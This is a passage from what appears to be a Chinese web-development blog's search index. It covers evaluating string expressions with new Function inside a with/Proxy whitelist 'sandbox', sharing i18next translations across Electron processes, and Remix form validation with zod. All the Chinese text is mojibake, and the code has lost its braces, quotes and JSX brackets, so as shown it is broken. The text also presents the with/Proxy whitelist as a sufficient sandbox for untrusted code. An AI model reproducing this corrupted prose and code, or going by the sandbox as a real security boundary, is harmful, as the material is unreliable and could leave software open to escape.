è¯­æ³•æœ‰ä¸ªç‰¹åˆ«å‰å®³çš„ç‰¹æ€§ï¼Œä½¿å…¶æˆä¸º JavaScript è¿™é—¨è¯­è¨€ä¸­æ— å¯æ›¿ä»£çš„é‡è¦è§’è‰²ã€‚ã€‚ ä»€ä¹ˆç‰¹æ€§å‘¢ï¼Ÿ é‚£å°±æ˜¯å‡½æ•°ä½“çš„æ•°æ®æ ¼å¼æ˜¯å­—ç¬¦ä¸²ï¼Œè¿™å¯æ˜¯ä¸ªä¸å¾—äº†çš„ä¸œè¥¿å•Šï¼ è§£æå‡½æ•°è¡¨è¾¾å¼åˆ©ç”¨ new Function çš„è¯­æ³•ç‰¹æ€§ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†å­—ç¬¦ä¸²å˜æˆå¯æ‰§è¡Œçš„ä»£ç ï¼š const compile = (expression: string, scope = ) = return new Function($root, `with($root) return ($expression); `)( scope );; compile å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æ‰§è¡Œçš„å­—ç¬¦ä¸²è¡¨è¾¾å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ‰§è¡Œæ—¶çš„ä½œç”¨åŸŸï¼Œå°† $self ç­‰å†…ç½®å…³é”®è¯ä¼ å…¥ scope ä¾›å‡½æ•°æ‰§è¡Œæ—¶è°ƒç”¨ã€‚ compile å®ç°æ—¶ä½¿ç”¨äº† with å…³é”®è¯ï¼Œå¸®åŠ©æˆ‘ä»¬ç®€åŒ–ä»£ç ï¼Œå¦‚æœä¸ä½¿ç”¨ with å…³é”®è¯ï¼Œscope é‡Œæ‰€æœ‰çš„å…ƒç´ éƒ½éœ€è¦ä¾æ¬¡ä¼ å…¥ new Function ä¸­ï¼š const compile = (expression, scope = ) = const keys = Object.keys(scope); const values = keys.map((key) = scope[key]); return new Function(...keys, `return ($expression);`)(...values);; ä¸è¿‡ï¼Œwith åœ¨æ€§èƒ½å’Œè¯­ä¹‰æ–¹é¢éƒ½æœ‰äº›é—®é¢˜ï¼ˆå…·ä½“é—®é¢˜è§ï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/withï¼‰ï¼Œè‡³äºç”¨ä¸ç”¨ï¼Œè‡ªå·±è€ƒè™‘å§ é™åˆ¶ä½œç”¨åŸŸç°åœ¨å­—ç¬¦ä¸²å¾—ä»¥æ‰§è¡Œäº†ï¼Œæ¥ä¸‹æ¥éœ€è¦è§£å†³çš„å°±æ˜¯å‡½æ•°çš„ä½œç”¨åŸŸé—®é¢˜äº†ã€‚ ç”± Function æ„é€ å‡½æ•°åˆ›å»ºçš„å‡½æ•°ä¸ä¼šåˆ›å»ºå½“å‰ç¯å¢ƒçš„é—­åŒ…ï¼Œå®ƒä»¬æ€»æ˜¯è¢«åˆ›å»ºäºå…¨å±€ç¯å¢ƒï¼Œå› æ­¤åœ¨è¿è¡Œæ—¶å®ƒä»¬åªèƒ½è®¿é—®å…¨å±€å˜é‡å’Œè‡ªå·±çš„å±€éƒ¨å˜é‡ï¼Œä¸èƒ½è®¿é—®å®ƒä»¬è¢« Function æ„é€ å‡½æ•°åˆ›å»ºæ—¶æ‰€åœ¨çš„ä½œç”¨åŸŸçš„å˜é‡ã€‚ var x = 10;function createFunction1() var x = 20; return new Function(return x;); // è¿™é‡Œçš„ x æŒ‡å‘æœ€ä¸Šé¢å…¨å±€ä½œç”¨åŸŸå†…çš„ xfunction createFunction2() var x = 20; function f() return x; // è¿™é‡Œçš„ x æŒ‡å‘ä¸Šæ–¹æœ¬åœ°ä½œç”¨åŸŸå†…çš„ x return f;var f1 = createFunction1();console.log(f1()); // 10var f2 = createFunction2();console.log(f2()); // 20 å› æ­¤ï¼Œå¦‚æœä»…ä»…æ˜¯é™åˆ¶è¡¨è¾¾å¼è®¿é—®åˆ›å»ºæ—¶æ‰€åœ¨çš„ä½œç”¨åŸŸçš„å˜é‡ï¼Œnew Function å°±è¶³å¤Ÿäº†ï¼Œå¦‚æœè¿˜æƒ³è¦é™åˆ¶è®¿é—®å…¨å±€ä½œç”¨åŸŸï¼Œé‚£ä¹ˆå°±è¦å®ç°ä¸€ä¸ªæ²™ç®±äº†ã€‚ æ²™ç®± å¼•ç”¨è‡ªï¼šæµ…æ JavaScript æ²™ç®±æœºåˆ¶ ä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿ åœ¨è®¡ç®—æœºå®‰å…¨ä¸­ï¼Œæ²™ç®±ï¼ˆSandboxï¼‰æ˜¯ä¸€ç§ç”¨äºéš”ç¦»æ­£åœ¨è¿è¡Œç¨‹åºçš„å®‰å…¨æœºåˆ¶ï¼Œé€šå¸¸ç”¨äºæ‰§è¡Œæœªç»æµ‹è¯•æˆ–ä¸å—ä¿¡ä»»çš„ç¨‹åºæˆ–ä»£ç ï¼Œå®ƒä¼šä¸ºå¾…æ‰§è¡Œçš„ç¨‹åºåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒï¼Œå†…éƒ¨ç¨‹åºçš„æ‰§è¡Œä¸ä¼šå½±å“åˆ°å¤–éƒ¨ç¨‹åºçš„è¿è¡Œã€‚ å¸¸è§çš„æ²™ç®±åº”ç”¨åœºæ™¯ï¼š æ‰§è¡Œ JSONP è¯·æ±‚å›æ¥çš„å­—ç¬¦ä¸²æ—¶æˆ–å¼•å…¥ä¸çŸ¥åç¬¬ä¸‰æ–¹ JS åº“æ—¶ï¼Œå¯èƒ½éœ€è¦åˆ›é€ ä¸€ä¸ªæ²™ç®±æ¥æ‰§è¡Œè¿™äº›ä»£ç ã€‚ Vue æ¨¡æ¿è¡¨è¾¾å¼çš„è®¡ç®—æ˜¯è¿è¡Œåœ¨ä¸€ä¸ªæ²™ç›’ä¹‹ä¸­çš„ï¼Œåœ¨æ¨¡æ¿å­—ç¬¦ä¸²ä¸­çš„è¡¨è¾¾å¼åªèƒ½è·å–éƒ¨åˆ†å…¨å±€å¯¹è±¡ï¼Œè¿™ä¸€ç‚¹å®˜æ–¹æ–‡æ¡£æœ‰æåˆ°ï¼Œè¯¦æƒ…å¯å‚é˜…æºç ã€‚ åœ¨çº¿ä»£ç ç¼–è¾‘å™¨ï¼Œå¦‚ CodeSanbox ç­‰åœ¨çº¿ä»£ç ç¼–è¾‘å™¨åœ¨æ‰§è¡Œè„šæœ¬æ—¶éƒ½ä¼šå°†ç¨‹åºæ”¾ç½®åœ¨ä¸€ä¸ªæ²™ç®±ä¸­ï¼Œé˜²æ­¢ç¨‹åºè®¿é—®å½±å“ä¸»é¡µé¢ã€‚ å¤Ÿç”¨çš„æ²™ç®±å®ç°ï¼š Proxy ä¸­çš„ get å’Œ set æ–¹æ³•åªèƒ½æ‹¦æˆªå·²å­˜åœ¨äºä»£ç†å¯¹è±¡ä¸­çš„å±æ€§ï¼Œå¯¹äºä»£ç†å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§è¿™ä¸¤ä¸ªé’©å­æ˜¯æ— æ„ŸçŸ¥çš„ã€‚å› æ­¤è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ Proxy.has() æ¥æ‹¦æˆª with ä»£ç å—ä¸­çš„ä»»æ„å˜é‡çš„è®¿é—®ï¼Œå¹¶è®¾ç½®ä¸€ä¸ªç™½åå•ï¼Œåœ¨ç™½åå•å†…çš„å˜é‡å¯ä»¥æ­£å¸¸èµ°ä½œç”¨åŸŸé“¾çš„è®¿é—®æ–¹å¼ï¼Œä¸åœ¨ç™½åå•å†…çš„å˜é‡ä¼šç»§ç»­åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ²™ç®±è‡ªè¡Œç»´æŠ¤çš„ä¸Šä¸‹æ–‡å¯¹è±¡ä¸­ï¼Œå­˜åœ¨åˆ™æ­£å¸¸è®¿é—®ï¼Œä¸å­˜åœ¨åˆ™ç›´æ¥æŠ¥é”™ã€‚ const withedCode = (code: string) = return new Function($root, `with($root) return ($code); `);;// å¯è®¿é—®å…¨å±€ä½œç”¨åŸŸçš„ç™½åå•åˆ—è¡¨const access_white_list = [Math, Date];const Sandbox = (code: string, scope = ) = // æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡çš„ä»£ç†å¯¹è±¡ const scopeProxy = new Proxy(scope, has: (target, prop) = // has å¯ä»¥æ‹¦æˆª with ä»£ç å—ä¸­ä»»æ„å±æ€§çš„è®¿é—® if (access_white_list.includes(prop)) // åœ¨å¯è®¿é—®çš„ç™½åå•å†…ï¼Œå¯ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ return target.hasOwnProperty(prop); if (!target.hasOwnProperty(prop)) throw new Error(`Invalid expression - $prop! You can not do that!`); return true; , ); withedCode(code).call(scopeProxy, scopeProxy);;// æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡const scope = func: (variable) = console.log(variable); , foo: foo,;// å¾…æ‰§è¡Œç¨‹åºconst code = ` Math.random() location.href = xxx func(foo)`;console.log(Sandbox(code, scope)); æœ€ç»ˆå®ç°ç‰ˆæœ¬const scope = $self: xxxx,;const ExpRE = /^\\s*\\\\([\\s\\S]*)\\\\\\s*$/;const withedCode = (code: string) = return new Function($root, `with($root) return ($code); `);;// å¯è®¿é—®å…¨å±€ä½œç”¨åŸŸçš„ç™½åå•åˆ—è¡¨const access_white_list = [Math, Date];const Sandbox = (source: string, scope = ) = const matched = source.match(ExpRE); if (!matched) return source; const code = matched[1]; // æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡çš„ä»£ç†å¯¹è±¡ const scopeProxy = new Proxy(scope, has: (target, prop) = // has å¯ä»¥æ‹¦æˆª with ä»£ç å—ä¸­ä»»æ„å±æ€§çš„è®¿é—® if (access_white_list.includes(prop)) // åœ¨å¯è®¿é—®çš„ç™½åå•å†…ï¼Œå¯ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ return target.hasOwnProperty(prop); if (!target.hasOwnProperty(prop)) throw new Error(`Invalid expression - $prop! You can not do that!`); return true; , ); withedCode(code).call(scopeProxy, scopeProxy);;"},{"title":"Electron - ä½¿ç”¨ i18next & react-i18next è¿›è¡Œå›½é™…åŒ–","path":"/2023/01/28/6c1ff1435713/","content":"tags: React i18next Electron categories: React Electron i18next æ˜¯ç¤¾åŒºä¸­ä¼˜ç§€çš„å›½é™…åŒ–æ¡†æ¶ï¼Œåœ¨ react ä¸­å¹¿æ³›ä½¿ç”¨ï¼Œæˆ‘å¸çš„å¤§é‡äº§å“éƒ½ä½¿ç”¨ i18next è¿›è¡Œå›½é™…åŒ–ï¼Œè€Œ react-i18next æ˜¯ i18next çš„ä¸€ä¸ªæ‰©å±•ï¼Œæä¾›äº†ä¸€äº› HOC åŠ hook æ–¹ä¾¿æˆ‘ä»¬åœ¨ react ä¸­ä½¿ç”¨ i18nextã€‚ ç”±äº electron æ˜¯å¤šè¿›ç¨‹æœºåˆ¶ï¼Œä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹éƒ½éœ€è¦ä¸ª i18next å®ä¾‹ï¼Œä½†æ˜¯å¤šå®ä¾‹å¸¦æ¥äº†ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚å¤šå®ä¾‹çš„è¯­è¨€å¦‚ä½•åŒæ­¥ï¼Œæ–‡æ¡ˆå¦‚ä½•é›†ä¸­ç®¡ç†ï¼Ÿ é’ˆå¯¹ä¸Šé¢çš„ä¸¤ä¸ªé—®é¢˜ï¼Œç»è¿‡å®è·µï¼Œæˆ‘ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š ä¸»è¿›ç¨‹è´Ÿè´£åŠ è½½ç”¨æˆ·é€‰æ‹©çš„è¯­è¨€å’Œå¯¹åº”çš„æ–‡æ¡ˆ æ¸²æŸ“è¿›ç¨‹é€šè¿‡è¿›ç¨‹é€šä¿¡ä»ä¸»è¿›ç¨‹çš„å®ä¾‹ä¸Šè·å–åˆå§‹åŒ–è¯­è¨€å’Œæ–‡æ¡ˆåˆå§‹åŒ–å®ä¾‹ ç”¨æˆ·åœ¨æ¸²æŸ“è¿›ç¨‹åˆ‡æ¢è¯­è¨€ï¼Œé€šè¿‡è¿›ç¨‹é€šä¿¡ï¼Œä¸»è¿›ç¨‹çš„ i18next å®ä¾‹åŠ è½½æ–°è¯­è¨€çš„æ–‡æ¡ˆï¼Œå¹¶è¿”å›ç»™æ¸²æŸ“è¿›ç¨‹åŠ¨æ€åŠ è½½åˆ°æ¸²æŸ“è¿›ç¨‹çš„å®ä¾‹ä¸­ æ•´ä¸ªæµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š ä¸»è¿›ç¨‹ç”¨æˆ·é€‰æ‹©çš„ç³»ç»Ÿè¯­è¨€ä¿å­˜åœ¨ electron-store ä¸­ï¼Œé€šè¿‡ getConfigStoreæ–¹æ³•è·å–ä¸Šæ¬¡ç”¨æˆ·é€‰æ‹©çš„ç³»ç»Ÿè¯­è¨€ï¼Œé»˜è®¤ä¸ºä¸­æ–‡ import Store from electron-store;export interface StoreState theme: string; config: NOTES.Config;export const getConfigStore = K extends keyof NOTES.Config(key: K) = return getStoreNOTES.Config[K](`config.$key`);;export const setConfigStore = (value: PartialNOTES.Config) = const config = getAllConfigStore(); return setStore(config, ...config, ...value );; i18next-fs-backend æ˜¯ i18next çš„ä¸€ä¸ªæ‰©å±•ï¼Œå…è®¸ Node.js ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åŠ è½½ç¿»è¯‘ import i18next from i18next;import i18nextBackend from i18next-fs-backend;import getConfigStore from ./store;i18next.use(i18nextBackend).init( lng: getConfigStore(lang) || zh-CN, fallbackLng: en-US, backend: loadPath: path.join(__dirname, ./i18n/lng.json), , interpolation: escapeValue: false, // react already safes from xss ,);export default i18next; i18next å®ä¾‹åˆå§‹åŒ–åï¼Œé€šè¿‡ loadLanguagesåŠ è½½å¯¹åº”è¯­è¨€çš„æ–‡æ¡ˆï¼ŒgetResourceBundleè·å–è¯­è¨€çš„æ–‡æ¡ˆï¼Œé€šè¿‡è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œæ¸²æŸ“è¿›ç¨‹å°±å¯ä»¥å…±äº«ä¸»è¿›ç¨‹çš„æ–‡æ¡ˆï¼Œå®ç°æ–‡æ¡ˆçš„é›†ä¸­ç®¡ç†ã€‚ import logger from electron-log;import i18next, LngOptions from ../../utils/i18n;export const getI18nLanguages = () = return LngOptions;;export const getI18nInitResource = async () = const lng = i18next.language; const resource = await getI18nResource(lng); return lng, resource ;;export const getI18nResource = async (lng: string) = await i18next.loadLanguages(lng).catch((err) = logger.error(err); ); return i18next.getResourceBundle(lng, );;export const changeI18nLang = async (lng: string) = return new Promiseboolean((resolve) = i18next.changeLanguage(lng, (err) = if (err) logger.error(err); resolve(!err); ); );; æ¸²æŸ“è¿›ç¨‹invokeCommandåŒå­¦ window ä¸ŠæŒ‚è½½çš„å˜é‡å’Œä¸»è¿›ç¨‹åŒå‘é€šè¡Œ export const invokeCommand = T(type: string, payload = ) = return window.api.invokeT(fromRenderer, type, payload, );; æ¸²æŸ“è¿›ç¨‹é€šè¿‡ invokeCommand è°ƒç”¨ä¸»è¿›ç¨‹çš„ getI18nInitResource æ–¹æ³•è·å–åˆå§‹çš„è¯­è¨€å’Œæ–‡æ¡ˆå®Œæˆå®ä¾‹çš„åˆå§‹åŒ–ã€‚ ç”¨æˆ·åˆ‡æ¢è¯­è¨€æ—¶ï¼ŒåŒæ ·é€šè¿‡è¿›ç¨‹é€šä¿¡è·å–æ–°è¯­è¨€çš„æ–‡æ¡ˆï¼Œé€šè¿‡ i18next.addResourceBundleåŠ¨æ€åŠ è½½åˆ°å®ä¾‹ä¸­ï¼Œè°ƒç”¨ i18next.changeLanguageå®Œæˆè¯­è¨€çš„åˆ‡æ¢ã€‚ import i18next, ResourceKey from i18next;import initReactI18next from react-i18next;import invokeCommand from @/commands;export const initI18next = async () = const lng, resource = await invokeCommand lng: string; resource: ResourceKey; (getI18nInitResource); return i18next.use(initReactI18next).init( lng, resources: [lng]: translation: resource, , , interpolation: escapeValue: false, , );;export const changeLanguage = async (lng: string) = if (!i18next.hasResourceBundle(lng, translation)) // åŠ¨æ€åŠ è½½è¯­è¨€ const resource = await invokeCommandResourceKey(getI18nResource, lng); i18next.addResourceBundle(lng, translation, resource); return i18next.changeLanguage(lng);;export default i18next; æ€»ç»“ï¼šelectron çš„å¤šè¿›ç¨‹æœºåˆ¶å¯¼è‡´ i18next ä¸å¾—ä¸åˆå§‹åŒ–å‡ºå¤šä¸ªå®ä¾‹ï¼Œä½†æ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥åˆ©ç”¨è¿›ç¨‹é€šä¿¡ï¼Œè®©ä¸€ä¸ªå®ä¾‹åŠ è½½æ–‡æ¡ˆï¼Œå†åŒæ­¥åˆ°å¦ä¸€ä¸ªå®ä¾‹ï¼Œå®ç°æ–‡æ¡ˆçš„é›†ä¸­ç®¡ç†ã€‚"},{"title":"Remix - è¡¨å•&æ¥å£å…¥å‚æ ¡éªŒ","path":"/2022/04/18/51f956ea22d7/","content":"å‰è¨€Remix æ˜¯ React Router å›¢é˜Ÿå¼€å‘çš„åŸºäº React æ¡†æ¶çš„å…¨æ ˆ Web æ¡†æ¶ã€‚æ—¢ç„¶æ˜¯åŸºäº React æ¡†æ¶ï¼Œé‚£ä¹ˆåœ¨ React ä¸­èƒ½å¤Ÿä½¿ç”¨çš„è¡¨å•æ ¡éªŒæ–¹æ¡ˆï¼ŒåŒæ ·é€‚ç”¨äº Remixã€‚ Remix ä¸­çš„å®¢æˆ·ç«¯è¡¨å•æ ¡éªŒå¯ä»¥é‡‡ç”¨ React çš„è¡¨å•æ ¡éªŒæ–¹æ¡ˆï¼Œä½†æ˜¯ Remix ä½œä¸ºä¸€ä¸ªå…¨æ ˆæ¡†æ¶ï¼Œè‡ªç„¶æ˜¯æœ‰æœåŠ¡ç«¯æ¥å£çš„ï¼Œé‚£ä¹ˆå…¶å…¥å‚æ ¡éªŒä¹Ÿæ˜¯å¦å¯ä»¥é‡‡ç”¨ node åç«¯é€šç”¨çš„å‚æ•°æ ¡éªŒæ–¹æ¡ˆï¼Ÿ ä¸‹é¢æˆ‘ä»¬å°±çœ‹çœ‹åœ¨å‰åç«¯éƒ½æ˜¯æ€ä¹ˆæ ¡éªŒå‚æ•°çš„ React è¡¨å•æ ¡éªŒæ¡†æ¶å†…ç½®æ ¡éªŒç”¨è¿‡ React ç»„ä»¶åº“åŒå­¦åº”è¯¥éƒ½çŸ¥é“ï¼Œè¿™äº›ç»„ä»¶åº“å†…éƒ¨ä¸€èˆ¬éƒ½ä¼šå†…ç½®ä¸€ä¸ªè¡¨å•æ ¡éªŒæ¨¡å—ï¼Œä¾‹å¦‚ Ant Design ï¼š import React from react;import Button, Checkbox, Form, Input from antd;const onFinish = (values: any) = console.log(Success:, values);;const onFinishFailed = (errorInfo: any) = console.log(Failed:, errorInfo);;const App: React.FC = () = ( Form name=basic labelCol= span: 8 wrapperCol= span: 16 style= maxWidth: 600 initialValues= remember: true onFinish=onFinish onFinishFailed=onFinishFailed autoComplete=off Form.Item label=Username name=username rules=[ required: true, message: Please input your username! ] Input / /Form.Item Form.Item label=Password name=password rules=[ required: true, message: Please input your password! ] Input.Password / /Form.Item Form.Item name=remember valuePropName=checked wrapperCol= offset: 8, span: 16 CheckboxRemember me/Checkbox /Form.Item Form.Item wrapperCol= offset: 8, span: 16 Button type=primary htmlType=submit Submit /Button /Form.Item /Form);export default App; ç‹¬ç«‹æ ¡éªŒæ¨¡å—è„±ç¦»ç»„ä»¶åº“æ¡†æ¶åï¼Œå‰ç«¯ç¤¾åŒºé‡Œè¿˜æ˜¯æœ‰å¾ˆå¤šå¯é€‰çš„æ ¡éªŒæ¨¡å—ï¼Œè¿™é‡Œæˆ‘åªä»‹ç»ä¸¤ä¸ªæˆ‘ä½¿ç”¨è¿‡å¹¶ä¸”ç»å¯¹ç‰¹åˆ«å¥½ç”¨çš„åº“ï¼š react-hook-formä»åå­—ä¸­å°±èƒ½çœ‹å‡ºï¼Œè¿™ä¸ªåº“ä¸»è¦é€‚ç”¨äº React æ¡†æ¶ï¼Œå› æ­¤ç”¨åŸç”Ÿå¼€å‘æ—¶éœ€è¦æ ¡éªŒè¡¨å•å¼ºçƒˆæ¨èè¯¥åº“ï¼Œå¹¶ä¸”å…¶ä¹Ÿèƒ½å¾ˆå¥½çš„èå…¥ç°æœ‰ç»„ä»¶åº“ã€‚ import useForm from react-hook-form;export default function App() const register, handleSubmit, watch, formState: errors = useForm(); const onSubmit = data = console.log(data); console.log(watch(example)); // watch input value by passing the name of it return ( /* handleSubmit will validate your inputs before invoking onSubmit */ form onSubmit=handleSubmit(onSubmit) /* register your input into the hook by invoking the register function */ input defaultValue=test ...register(example) / /* include validation with required or other standard HTML validation rules */ input ...register(exampleRequired, required: true ) / /* errors will return when field validation fails */ errors.exampleRequired spanThis field is required/span input type=submit / /form ); Zod è¿™ä¸ªåº“å°±æ˜¯ä¸ªçº¯ç²¹çš„å­—æ®µæ ¡éªŒçš„åº“äº†ï¼Œæ­£æ˜¯å› ä¸ºçº¯ç²¹ï¼Œç¤¾åŒºä¸ºå…¶å¼€å‘äº†å„ç§é€‚é…å™¨ï¼Œå¯ä»¥å°† zod åº”ç”¨åˆ°ä»»ä½•éœ€è¦å­—æ®µæ ¡éªŒçš„åœ°æ–¹ï¼Œä¸‹é¢çœ‹ä¸‹ zod å¦‚ä½•åº”ç”¨åœ¨ React è¡¨å•æ ¡éªŒï¼š import z from zod;import useZorm from react-zorm;const FormSchema = z.object( name: z.string().min(1), password: z .string() .min(10) .refine((pw) = /[0-9]/.test(pw), Password must contain a number),);function Signup() const zo = useZorm(signup, FormSchema, onValidSubmit(e) e.preventDefault(); alert(Form ok! + JSON.stringify(e.data, null, 2)); , ); const disabled = zo.validation?.success === false; return ( form ref=zo.ref Name: input type=text name=zo.fields.name() className=zo.errors.name(errored) / zo.errors.name((e) = ( ErrorMessage message=e.message / )) Password: input type=password name=zo.fields.password() className=zo.errors.password(errored) / zo.errors.password((e) = ( ErrorMessage message=e.message / )) button disabled=disabled type=submit Signup! /button preValidation status: JSON.stringify(zo.validation, null, 2)/pre /form ); æœåŠ¡ç«¯æ¥å£å…¥å‚æ ¡éªŒåœ¨æœåŠ¡ç«¯æ ¡éªŒå…¥å‚æœ¬è´¨ä¸Šå°±æ˜¯æ ¡éªŒå­—æ®µï¼Œé‚£ä¹ˆå…ˆçœ‹ä¸‹å…¶å®ƒçš„ node æœåŠ¡ç«¯æ¡†æ¶éƒ½æ˜¯æ€ä¹ˆæ ¡éªŒå‚æ•°çš„ï¼š Egg Egg ä½¿ç”¨ egg-validate æ¨¡å—è¿›è¡Œå‚æ•°æ ¡éªŒï¼ŒåŸºæœ¬ç”¨æ³•å¦‚ä¸‹ï¼š class XXXController extends app.Controller // ... async XXX() const ctx = this; ctx.validate( system : type: string, required: false, defValue: account, desc: ç³»ç»Ÿåç§°, token : type: string, required: true, desc: token éªŒè¯, redirect: type: string, required: false, desc: ç™»å½•è·³è½¬ ); // if (config.throwError === false) if(ctx.paramErrors) // get error infos from `ctx.paramErrors`; let params = ctx.params; let query, body = ctx.request; // ctx.params = validater.ret.params; // ctx.request.query = validater.ret.query; // ctx.request.body = validater.ret.body; // ... ctx.body = query; // ... nestjs nestjs ä¸»è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„ class-validator æ¥è¿›è¡Œå‚æ•°æ ¡éªŒã€‚ import Injectable, PipeTransform, ArgumentMetadata, ValidationError, HttpException, HttpStatus from @nestjs/common;import plainToClass from class-transformer;import validate from class-validator;/** * è¿™æ˜¯ä¸€ä¸ªå…¨å±€çš„å‚æ•°éªŒè¯ç®¡é“ï¼ŒåŸºäºclass-transformer * å¦‚æœå¤±è´¥ï¼Œåˆ™ä¼šæŠ›å‡ºHttpException * åœ¨main.tsçš„nestAppè¦å°†å®ƒè®¾ä¸ºå…¨å±€çš„ */@Injectable()export class ValidationPipe implements PipeTransform async transform(value: any, metatype : ArgumentMetadata) if (!metatype || !this.toValidate(metatype)) return value; const object = plainToClass(metatype, value); const errors = await validate(object); const errorList: string[] = []; const errObjList: ValidationError[] = [...errors]; do const e = errObjList.shift(); if (!e) break; if (e.constraints) for (const item in e.constraints) errorList.push(e.constraints[item]); if (e.children) errObjList.push(...e.children); while (true); if (errorList.length 0) throw new HttpException(è¯·æ±‚å‚æ•°æ ¡éªŒé”™è¯¯: + errorList.join(), HttpStatus.INTERNAL_SERVER_ERROR); return object; private toValidate(metatype: Function): boolean const types: Function[] = [String, Boolean, Number, Array, Object]; return !types.includes(metatype); ä»ä¸Šé¢çš„ä¸¤ä¸ªæ¡†æ¶å¯ä»¥çœ‹å‡ºæ¥ï¼Œå¯¹äºå¦‚ä½•è¿›è¡Œå‚æ•°æ ¡éªŒï¼Œå¤§å®¶çš„å¤„ç†è¿‡ç¨‹éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œéƒ½æ˜¯å…ˆå®šä¹‰ä¸€å¥—è§„åˆ™ï¼Œç„¶åç”¨è¿™å¥—è§„åˆ™å»æ ¡éªŒå­—æ®µã€‚ é‚£ä¹ˆåœ¨ remix ä¸­æ ¡éªŒå…¥å‚è‡ªç„¶ä¹Ÿæ˜¯è¿™ä¸ªæµç¨‹ï¼Œä¸‹é¢çš„ç¤ºä¾‹ä¸­ä¼šä½¿ç”¨ zod æ¥æ ¡éªŒå‚æ•°ï¼š import type ActionArgs from @remix-run/node;import z from zod;import parseFormAny, useZorm from react-zorm;const LoginSchema = z.object( email: z .string( required_error: Email is required ) .email( message: Invalid email ), password: z .string( required_error: Password is required ) .min(8, message: Password must be at least 8 characters ), remember: z.optional(z.boolean()),);export async function action( request : ActionArgs) const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); if (!result.success) return json( errors: result.error , status: 400 ); å‰åç«¯æ ¡éªŒç»Ÿä¸€ä¸Šé¢åˆ†åˆ«ä»‹ç»äº†å¦‚ä½•åœ¨å‰åç«¯æ ¡éªŒå‚æ•°ï¼Œä½†æ˜¯å¦‚æœæ˜¯ä¸€ä¸ªå‰åç«¯åˆ†ç¦»çš„é¡¹ç›®ï¼Œé‚£ä¹ˆå‰åç«¯åˆ†å¼€æ ¡éªŒå¹¶ä¸”ä½¿ç”¨ä¸åŒçš„æ ¡éªŒæ–¹æ¡ˆè‡ªç„¶æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯åœ¨ remix è¿™ä¹ˆä¸€ä¸ªå…¨æ ˆæ¡†æ¶é‡Œä½¿ç”¨ä¸¤å¥—æ ¡éªŒæ–¹æ¡ˆï¼Œå¤šå°‘æ˜¾å¾—æœ‰äº›å†—ä½™äº†ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å¯¼è‡´å‰åç«¯æ ¡éªŒä¸ä¸€è‡´çš„é—®é¢˜ã€‚ é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ¡ˆï¼Œå¯ä»¥åªå†™ä¸€å¥—æ ¡éªŒè§„åˆ™ï¼ŒåŒæ—¶é€‚ç”¨äºå‰åç«¯å—ï¼Ÿ è‡ªç„¶æ˜¯å¯ä»¥çš„ï¼Œå…¶å®ä¸Šæ–‡å·²ç»ç»™å‡ºäº†ç­”æ¡ˆï¼Œå°±æ˜¯ä½¿ç”¨ zod æ¥æ ¡éªŒå‚æ•°ï¼Œä¸‹é¢ç»™å‡ºä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼š import React from react;import IconBrandGithub, IconBrandTwitter from @tabler/icons-react;import Link, Form from @remix-run/react;import type ActionArgs from @remix-run/node;import json, redirect from @remix-run/node;import parseFormAny, useZorm from react-zorm;import z from zod;import LoginLayout from ~/components/user-layout;import FormInner from ~/components/form/form-inner;import Input from ~/components/input;import Button from ~/components/button;import Checkbox from ~/components/checkbox;import loginUser, setAuthSession from ~/modules/auth;import authCookie from ~/integrations/supabase;const LoginSchema = z.object( email: z .string( required_error: Email is required ) .email( message: Invalid email ), password: z .string( required_error: Password is required ) .min(8, message: Password must be at least 8 characters ), remember: z.optional(z.boolean()),);export async function action( request : ActionArgs) const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); let session = await authCookie.getSession(request.headers.get(Cookie)); if (!result.success) return json( errors: result.error , status: 400 ); const accessToken, refreshToken, error = await loginUser( result.data.email, result.data.password ); if (error || !accessToken || !refreshToken) return json( formError: error || Something went wrong , 403); session = setAuthSession(session, accessToken, refreshToken); return redirect(/, headers: Set-Cookie: await authCookie.commitSession(session), , );const Login: React.FC = () = const zo = useZorm(NewQuestionWizardScreen, LoginSchema); const renderFooter = () = ( div className=hr-textor/div div className=card-body div className=row div className=col Button href=# icon=IconBrandGithub className=text-github / block Login with Github /Button /div div className=col Button href=# icon=IconBrandTwitter className=text-twitter / block Login with Twitter /Button /div /div /div / ); return ( LoginLayout title=Login to your account footer=renderFooter() description= Dont have account yet? Link to=/sign-upSign up/Link / Form ref=zo.ref method=post replace FormInner label=Email address required error=zo.errors.email()?.message Input name=zo.fields.email() type=email placeholder=your@email.com / /FormInner FormInner label=Password required labelSuffix=Link to=/forgot-passwordI forgot password/Link error=zo.errors.password()?.message Input name=zo.fields.password() type=password placeholder=Your password / /FormInner div className=mb-2 Checkbox name=zo.fields.remember() Remember me on this device /Checkbox /div div className=form-footer Button buttonType=submit type=primary block Sign in /Button /div /Form /LoginLayout );;export default 